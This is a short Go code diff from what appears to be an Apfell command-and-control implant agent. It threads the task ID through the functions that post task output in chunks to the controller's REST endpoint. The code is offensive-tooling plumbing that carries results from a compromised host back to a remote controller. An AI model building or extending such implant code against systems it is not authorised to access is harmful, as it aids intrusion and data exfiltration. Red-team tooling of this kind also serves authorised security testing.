@@ -212,13 +212,13 @@ func (c *C2Default) GetTasking() interface{} {
 }
 
 //PostResponse - Post task responses
-func (c *C2Default) PostResponse(task structs.Msg, output string) []byte {
+func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
 	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
-	return c.postRESTResponse(endpoint, []byte(output))
+	return c.postRESTResponse(endpoint, task, []byte(output))
 }
 
 //postRESTResponse - Wrapper to post task responses through the Apfell rest API
-func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
+func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data []byte) []byte {
 	size := len(data)
 	const dataChunk = 512000 //Normal apfell chunk size
 	r := bytes.NewBuffer(data)
@@ -236,8 +236,9 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 		}
 
 		responseMsg := structs.TaskResponseMessage{}
-		resp := structs.TaskResponse{}
+		resp := structs.Response{}
 		resp.Response = dataBuffer
+		resp.TaskID = task.TaskID
 		responseMsg.Responses = append(responseMsg.Responses, resp...)
 
 		dataToSend, _ := json.Marshal(responseMsg)
